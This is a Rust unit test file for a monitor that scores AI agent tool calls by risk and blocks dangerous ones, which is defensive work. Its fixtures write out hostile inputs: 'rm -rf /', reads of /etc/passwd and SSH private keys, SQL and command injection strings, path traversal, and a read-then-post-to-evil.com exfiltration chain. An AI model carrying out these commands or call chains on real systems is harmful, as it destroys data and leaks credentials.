//! Unit tests for Tool Monitor

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn monitor() -> ToolMonitor {
        ToolMonitor::new()
    }

    // ==================== Risk Level Assessment ====================

    #[test]
    fn test_safe_tool() {
        let m = monitor();
        let result = m.assess("web_search", "mcp", json!({"query": "weather"}));
        assert_eq!(result.risk_level, RiskLevel::Low);
        assert!(result.allowed);
    }

    #[test]
    fn test_shell_execute_high_risk() {
        let m = monitor();
        let result = m.assess("shell_execute", "mcp", json!({"command": "ls -la"}));
        assert!(result.risk_level >= RiskLevel::Medium);
    }

    #[test]
    fn test_file_write_medium_risk() {
        let m = monitor();
        let result = m.assess("file_write", "mcp", json!({"path": "/tmp/test.txt"}));
        assert!(result.risk_level >= RiskLevel::Medium);
    }

    #[test]
    fn test_database_query_medium_risk() {
        let m = monitor();
        let result = m.assess("database_query", "mcp", json!({"sql": "SELECT * FROM users"}));
        assert!(result.risk_level >= RiskLevel::Medium);
    }

    // ==================== Dangerous Commands ====================

    #[test]
    fn test_block_rm_rf() {
        let m = monitor();
        let result = m.assess("shell", "mcp", json!({"command": "rm -rf /"}));
        assert_eq!(result.risk_level, RiskLevel::Critical);
        assert!(!result.allowed);
    }

    #[test]
    fn test_block_sudo() {
        let m = monitor();
        let result = m.assess("shell", "mcp", json!({"command": "sudo rm file"}));
        assert!(result.risk_level >= RiskLevel::High);
        assert!(result.flags.iter().any(|f| f.contains("sudo")));
    }

    #[test]
    fn test_block_chmod_777() {
        let m = monitor();
        let result = m.assess("shell", "mcp", json!({"command": "chmod 777 /etc/passwd"}));
        assert!(result.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_block_etc_passwd() {
        let m = monitor();
        let result = m.assess("file_read", "mcp", json!({"path": "/etc/passwd"}));
        assert!(result.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_block_ssh_keys() {
        let m = monitor();
        let result = m.assess("file_read", "mcp", json!({"path": "~/.ssh/id_rsa"}));
        assert!(result.risk_level >= RiskLevel::Critical);
        assert!(!result.allowed);
    }

    // ==================== Network Operations ====================

    #[test]
    fn test_http_request_safe() {
        let m = monitor();
        let result = m.assess("http_request", "mcp", json!({
            "url": "https://api.example.com/data",
            "method": "GET"
        }));
        assert!(result.risk_level <= RiskLevel::Medium);
    }

    #[test]
    fn test_http_post_with_data() {
        let m = monitor();
        let result = m.assess("http_request", "mcp", json!({
            "url": "https://api.example.com/upload",
            "method": "POST",
            "body": "sensitive data"
        }));
        assert!(result.risk_level >= RiskLevel::Medium);
    }

    #[test]
    fn test_suspicious_port() {
        let m = monitor();
        let result = m.assess("network_connect", "mcp", json!({
            "host": "evil.com",
            "port": 4444
        }));
        assert!(result.risk_level >= RiskLevel::High);
    }

    // ==================== Allowlist/Denylist ====================

    #[test]
    fn test_allowlist_only() {
        let mut m = monitor();
        m.set_allowlist(vec!["web_search".to_string(), "calculator".to_string()]);
        
        let result1 = m.assess("web_search", "mcp", json!({}));
        let result2 = m.assess("shell_execute", "mcp", json!({}));
        
        assert!(result1.allowed, "Allowlisted tool should be allowed");
        assert!(!result2.allowed, "Non-allowlisted tool should be blocked");
    }

    #[test]
    fn test_denylist() {
        let mut m = monitor();
        m.set_denylist(vec!["dangerous_tool".to_string()]);
        
        let result = m.assess("dangerous_tool", "mcp", json!({}));
        assert!(!result.allowed, "Denylisted tool should be blocked");
    }

    // ==================== MCP Protocol Specifics ====================

    #[test]
    fn test_mcp_tool_call() {
        let m = monitor();
        let result = m.assess("mcp_tool", "mcp", json!({
            "method": "tools/call",
            "params": {"name": "filesystem_read", "arguments": {"path": "/tmp"}}
        }));
        // Should analyze the nested tool
    }

    // ==================== Tool Chaining ====================

    #[test]
    fn test_detect_tool_chain() {
        let m = monitor();
        
        // Record multiple tool calls in sequence
        m.record_call("agent-1", "file_read", json!({"path": "/etc/passwd"}));
        m.record_call("agent-1", "http_post", json!({"url": "http://evil.com"}));
        
        let chain_risk = m.assess_chain("agent-1");
        assert!(chain_risk >= RiskLevel::High, "Should detect suspicious chain");
    }

    // ==================== Rate Limiting ====================

    #[test]
    fn test_rate_limit_detection() {
        let m = monitor();
        
        // Many calls in short time
        for i in 0..100 {
            m.record_call("agent-1", "api_call", json!({"n": i}));
        }
        
        let result = m.assess("api_call", "mcp", json!({}));
        assert!(result.flags.iter().any(|f| f.contains("rate")) || 
                result.risk_level >= RiskLevel::Medium);
    }

    // ==================== Argument Validation ====================

    #[test]
    fn test_sql_injection_in_args() {
        let m = monitor();
        let result = m.assess("database_query", "mcp", json!({
            "query": "SELECT * FROM users WHERE id = '1; DROP TABLE users;--'"
        }));
        assert!(result.risk_level >= RiskLevel::High);
        assert!(result.flags.iter().any(|f| f.contains("sql_injection")));
    }

    #[test]
    fn test_command_injection_in_args() {
        let m = monitor();
        let result = m.assess("shell", "mcp", json!({
            "command": "echo hello; cat /etc/passwd"
        }));
        assert!(result.risk_level >= RiskLevel::High);
    }

    #[test]
    fn test_path_traversal() {
        let m = monitor();
        let result = m.assess("file_read", "mcp", json!({
            "path": "../../../etc/passwd"
        }));
        assert!(result.risk_level >= RiskLevel::High);
        assert!(result.flags.iter().any(|f| f.contains("path_traversal")));
    }

    // ==================== Tool Statistics ====================

    #[test]
    fn test_tool_call_stats() {
        let m = monitor();
        
        m.record_call("agent-1", "web_search", json!({}));
        m.record_call("agent-1", "web_search", json!({}));
        m.record_call("agent-1", "calculator", json!({}));
        
        let stats = m.get_stats("agent-1");
        assert_eq!(stats.get("web_search"), Some(&2));
        assert_eq!(stats.get("calculator"), Some(&1));
    }

    // ==================== Safe Operations ====================

    #[test]
    fn test_calculator_safe() {
        let m = monitor();
        let result = m.assess("calculator", "mcp", json!({"expression": "2 + 2"}));
        assert_eq!(result.risk_level, RiskLevel::Low);
        assert!(result.allowed);
    }

    #[test]
    fn test_read_public_file_safe() {
        let m = monitor();
        let result = m.assess("file_read", "mcp", json!({"path": "/tmp/public.txt"}));
        assert!(result.risk_level <= RiskLevel::Medium);
    }

    // ==================== Edge Cases ====================

    #[test]
    fn test_empty_tool_name() {
        let m = monitor();
        let result = m.assess("", "mcp", json!({}));
        assert!(result.risk_level >= RiskLevel::Medium);
    }

    #[test]
    fn test_null_arguments() {
        let m = monitor();
        let result = m.assess("some_tool", "mcp", json!(null));
        // Should handle null gracefully
    }

    #[test]
    fn test_very_long_tool_name() {
        let m = monitor();
        let long_name = "a".repeat(10000);
        let result = m.assess(&long_name, "mcp", json!({}));
        // Should handle without panic
    }
}
